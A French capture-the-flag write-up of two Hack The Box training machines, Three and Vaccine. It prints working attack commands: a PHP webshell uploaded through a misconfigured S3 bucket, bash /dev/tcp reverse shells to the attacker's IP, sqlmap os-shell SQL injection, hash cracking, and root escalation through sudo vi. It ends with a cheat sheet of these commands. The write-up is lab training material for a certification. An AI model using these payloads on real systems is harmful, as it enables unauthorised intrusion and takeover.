# HTB — Three & Vaccine (Starting Point)

> Deux box rootées en solo. Three (Tier 1) puis Vaccine (Tier 2), la première attaquée volontairement sans lire les questions, pour se mettre en conditions eJPT.
>
> Payloads défangés ; IP/ports en placeholders. Remettre de vraies valeurs pour rejouer.

## La boussole (à relire à chaque box)

```
1. Scan complet des ports (nmap)   → qu'est-ce qui écoute ?
2. Pour CHAQUE service ouvert       → énumérer (web ? vhost ? DB ? partage ? FTP ?)
3. Trouver la prise                 → la faille qui donne un pied dedans
4. Pied dedans (shell)              → STABILISER (pty)
5. Énumérer depuis l'intérieur      → escalade de privilèges (privesc)
```

Principe directeur : on n'attaque pas un service *parce qu'il est là*, mais celui qui **offre une prise**. (SSH sans identifiants = porte blindée, jamais le point d'entrée.)

---

# Box 1 — Three (Tier 1)

**Thème :** virtual hosts + bucket S3 (AWS) mal configuré → webshell → RCE.

## 1. Recon
```bash
nmap <ip>
# 22/tcp ssh, 80/tcp http
```
Le site web (port 80) mentionne un email → nom de domaine `thetoppers.htb`.

## 2. Résolution de nom (pas de DNS sur HTB)
```bash
sudo sh -c 'echo "<ip>   thetoppers.htb" >> /etc/hosts'
```

## 3. Énumération de sous-domaines / vhosts
Deux familles à ne pas confondre :
- **Sous-domaines DNS** (`amass`, `sublist3r`, `dnsenum`) → inutile sur HTB (pas de DNS public).
- **Virtual Hosts** = plusieurs sites sur la même IP, choisis via l'en-tête `Host:` → c'est ça sur HTB.

```bash
gobuster vhost -u http://thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
# → s3.thetoppers.htb
```
Piège : sans `--append-domain`, gobuster teste `admin` au lieu de `admin.thetoppers.htb`. Lecture du résultat : le vrai vhost sort avec une taille (`Size`) différente du bruit. Ajouter le nouveau vhost à `/etc/hosts` aussi.

## 4. Service sur le sous-domaine = faux S3 AWS
```bash
sudo apt install -y awscli      # sur Kali : apt, PAS le zip officiel
aws configure                   # mettre des creds BIDON non vides (test/test/test/test)
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
#   PRE images/
#   .htaccess
#   index.php    ← site en PHP + on peut LIRE le bucket
```
Le contenu du bucket = la racine du site web. Ce que je dépose à la racine du bucket devient `http://thetoppers.htb/monfichier`.

## 5. Webshell → RCE
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/
curl "http://thetoppers.htb/shell.php?cmd=id"
# uid=33(www-data) → j'exécute des commandes sur la box
```

## 6. Upgrade en reverse shell
```bash
# Terminal A (D'ABORD) :
nc -lvnp 4444
# Puis via un php-reverse-shell édité (IP = tun0, port = 4444) déposé dans le bucket
```
Flag récupéré dans `/var/www/flag.txt`.

---

# Box 2 — Vaccine (Tier 2) — attaquée sans le guide

**Thème :** FTP anonyme → zip protégé cassé → hash MD5 → SQLi PostgreSQL → sqlmap os-shell → reverse shell → réutilisation de mot de passe → SSH → `sudo vi` (GTFOBins) → root.

## 1. Recon + FTP anonyme
Port FTP ouvert → connexion anonyme → récupération d'un `backup.zip`.

## 2. Casser le zip protégé (John)
```bash
zip2john backup.zip > ziphash.txt          # xxx2john : zip/rar/pdf/ssh...
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
john --show ziphash.txt
unzip -P <motdepasse> backup.zip
```
Réflexe : fichier protégé → chercher un outil `xxx2john`. rockyou parfois compressé : `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.

## 3. Dans le zip : source du site + hash MD5 admin → login
Hash MD5 cassé (crackstation / john) → connexion au panneau admin.

## 4. Injection SQL détectée à la main
Un simple `'` dans la recherche casse la requête :
```
Select * from cars where name ilike '%'%'
```
Le mot-clé **`ilike`** = PostgreSQL (MySQL n'a pas ILIKE). Une erreur SQL ne dit pas que « c'est vulnérable » — elle dit **quel moteur** j'affronte.

## 5. sqlmap (avec la session authentifiée)
```bash
sqlmap -u "http://<ip>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<ma_valeur>" \
  --batch --os-shell
```
Sans le cookie, sqlmap est éjecté vers le login. Cookie via F12 → Storage → Cookies. PostgreSQL DBA → `COPY ... FROM PROGRAM` → RCE en tant que `postgres`.

## 6. os-shell → vrai reverse shell
Le `--os-shell` de sqlmap = preuve de RCE, pas un lieu de vie (lent, blind, meurt sur linpeas). On saute vers un vrai shell :
```bash
# Terminal A : nc -lvnp 4444
# Dans l'os-shell :
bash -c 'bash -i >& /dev/tcp/<tun0>/4444 0>&1'
```
`/dev/tcp/IP/PORT` = pseudo-fichier magique de bash → ouvre un socket TCP.

## 7. Stabiliser le shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## 8. Privesc — la clé = réutilisation de mot de passe
Le mot de passe n'est pas à deviner : il est écrit dans le code du site (chaîne de connexion à la DB) :
```bash
grep -ri "password" /var/www/html
cat /var/www/html/dashboard.php     # password=... de pg_connect
```
Les gens réutilisent leurs mots de passe. Un mdp trouvé → le retester ailleurs.
```bash
ssh postgres@<ip>         # même mdp que la DB → session propre et stable
sudo -l
# (root) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

## 9. Root via GTFOBins (évasion vi)
Piège : `sudo vi -c ':shell'` échoue — sudoers verrouille la commande exacte + arguments. Il faut lancer la commande AUTORISÉE, puis s'évader DE L'INTÉRIEUR.
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf   # vi tourne en root
# puis, dans vi (Échap d'abord) :
:!/bin/bash
# → uid=0(root)
```
Une règle sudo sur un éditeur/pager (`vi`, `nano`, `less`, `more`, `man`) est presque toujours une faille → réflexe GTFOBins, section `sudo`.

---

# Fiches outils (mémo)

| Besoin | Commande |
|---|---|
| Scan ports | `nmap -sV -sC -p- <ip>` (puis ciblé) |
| Résolution sans DNS | `sudo nano /etc/hosts` → `<ip> domaine.htb` |
| Vhosts | `gobuster vhost -u http://dom -w <wl> --append-domain` |
| Nature réelle d'un fichier | `file <fichier>` |
| Casser un zip | `zip2john f.zip > h ; john --wordlist=rockyou.txt h ; john --show h` |
| S3 factice | `aws --endpoint-url=http://s3.dom s3 ls s3://bucket` (creds bidon) |
| Webshell PHP | `<?php system($_GET["cmd"]); ?>` → `?cmd=id` |
| Reverse shell bash | `bash -i >& /dev/tcp/<tun0>/4444 0>&1` |
| Listener | `nc -lvnp 4444` |
| Stabiliser shell | `python3 -c 'import pty;pty.spawn("/bin/bash")'` + `export TERM=xterm` |
| SQLi auto | `sqlmap -u "URL?p=x" --cookie="PHPSESSID=..." --batch --os-shell` |
| Chercher des mdp | `grep -ri "password" /var/www/html` |
| Privesc sudo | `sudo -l` → binaire → gtfobins.github.io |

---

# Pièges qui m'ont le plus appris

1. **Faux zip** (`awscliv2.zip` = page HTML) → réflexe `file` avant de s'arracher les cheveux. Sur Kali : `apt install` avant de télécharger un binaire à la main.
2. **Guillemet non fermé** (`dquote>`) → une commande qui « ne fait rien » est souvent une commande jamais envoyée. Lire le prompt du shell. Sortie : `Ctrl+C`.
3. **IP `127.0.0.1` dans le reverse shell** → il faut mon IP `tun0`, sinon la box s'appelle elle-même.
4. **sqlmap sans cookie** → éjecté vers le login.
5. **`sudo vi -c ':shell'`** → refusé : sudoers verrouille la commande+args exacts. S'évader DEPUIS vi.

---

# Bilan

- 2 box rootées en solo, dont une sans le guide (conditions eJPT).
- Compétences : vhost enum, `/etc/hosts`, AWS CLI/S3, webshell, reverse shell + stabilisation, `zip2john`, détection SQLi manuelle + identification du SGBD, sqlmap os-shell → reverse, réutilisation de mdp, GTFOBins (vi).
